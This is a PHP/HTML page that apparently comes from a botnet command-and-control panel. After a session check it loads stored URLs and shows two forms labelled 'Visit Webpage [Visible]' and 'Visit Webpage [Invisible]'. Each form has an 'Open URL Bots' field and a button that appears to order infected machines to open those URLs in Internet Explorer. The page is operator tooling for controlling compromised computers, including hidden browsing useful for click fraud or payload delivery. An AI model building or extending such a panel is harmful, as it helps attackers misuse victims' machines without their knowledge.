<?php
@session_start(); if ( !isset($_SESSION['login']) ){ exit() ; }
require_once('../Class/class.base.de.datos.php');
require_once('../Configs/Configs.php');
	


$http = $DB->Select("SELECT * FROM urls");

?>

<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<body background="archivos/imagen/bg.gif">
<form method="POST" action="">
<div align="center">
<table style="border:1px solid #000000; border-collapse:collapse" width="759" bgColor="#808080" border="0" height="133">
<tr>
<td style="BORDER-RIGHT: #666666 1px solid; BORDER-TOP: #666666 1px solid; BORDER-LEFT: #666666 1px solid; BORDER-BOTTOM: #666666 1px solid; BACKGROUND-COLOR: #cccccc" align="middle" width="95%" background="archivos/imagen/bg.gif">
<p><b><font color="#666666" face="Tahoma" size="2">Visit Webpage [Visible].</font></b><br>
<div id='mensajebot' name='mensajebot' align='center' style="color:#FF0000"></div>
<br>
</p>
<table width="96%" height="69" background="archivos/imagen/fondo.png" style="border-style:solid; border-width:1px; ">
  <tr>
    <td width='29%' height="26" align='left' bgcolor="#333333"><font face="Verdana" size="1" color="#FFFFFF">Open URL Bots: </font></td>
    <td align='left' width="68%" bgcolor="#333333"><div> <span style="margin-left:0px" name="div_1_mensaje" id="div_1_mensaje"> <font size="1" face="Verdana">
      <input name="domin" id="domin" style="border:1px solid #FFFFFF; width: 420; color:#666666; font-family:Verdana; font-size:8pt; background-color:#000000; float:left; height:17" value="<?php echo $http[0]['Urls'] ; ?>" size="1" />
    </font> </span> </div></td>
  </tr>
  <tr>
    <td width='29%' align='left' height="35">&nbsp;</td>
    <td align='left' width="68%" height="35"><div> <font size="1" face="Verdana"> &nbsp;</font></span></div>
        <font size="1" face="Verdana"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
          &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </font></td>
  </tr>
</table>
<p>
    <input type="button" value="Open Internet Explorer" name="enviar" onclick='submitInternetExplorer();' style="font-family: Tahoma; font-size: 8pt; border: 1px solid #FFFFFF; ; color:#666666; background-color:#000000">
	<br>
&nbsp;</p></td>
</tr>
</table>
</div>
</form>
<form method="POST" action="">
<div align="center">
<table style="border:1px solid #000000; border-collapse:collapse" width="759" bgColor="#808080" border="0" height="133">
<tr>
<td style="BORDER-RIGHT: #666666 1px solid; BORDER-TOP: #666666 1px solid; BORDER-LEFT: #666666 1px solid; BORDER-BOTTOM: #666666 1px solid; BACKGROUND-COLOR: #cccccc" align="middle" width="95%" background="archivos/imagen/bg.gif">
<b><font color="#666666" face="Tahoma" size="2">Visit Webpage [Invisible].</font></b><br>
<div id='mensajebot2' name='mensajebot2' align='center' style="color:#FF0000"></div>
<br>
</p>
<table width="96%" height="69" background="archivos/imagen/fondo.png" style="border-style:solid; border-width:1px; ">
  <tr>
    <td width='29%' height="26" align='left' bgcolor="#333333"><font face="Verdana" size="1" color="#FFFFFF">Open URL Bots: </font></td>
    <td align='left' width="68%" bgcolor="#333333"><div> 
		<span style="margin-left:0px" name="div_1_mensaje" id="div_1_mensaje"> <font size="1" face="Verdana">
      <input name="ExecuteHttp2" id="ExecuteHttp2" style="border:1px solid #FFFFFF; width: 420; color:#666666; font-family:Verdana; font-size:8pt; background-color:#000000; float:left; height:17" value="<?php echo $http[0]['Urls2'] ; ?>" size="1" />
    </font> </span> </div></td>
  </tr>
  <tr>
    <td width='29%' align='left' height="35">&nbsp;</td>
    <td align='left' width="68%" height="35"><div> <font size="1" face="Verdana"> &nbsp;</font></span></div>
        <font size="1" face="Verdana"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
          &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </font></td>
  </tr>
</table>
<p>
    <input type="button" value="Open Internet Explorer" name="enviar2" onclick='submitInternetExplorer2();' style="font-family: Tahoma; font-size: 8pt; border: 1px solid #FFFFFF; ; color:#666666; background-color:#000000">
	<br>
&nbsp;</p></td>
</tr>
</table>
</div>
</form>
</body>
</html>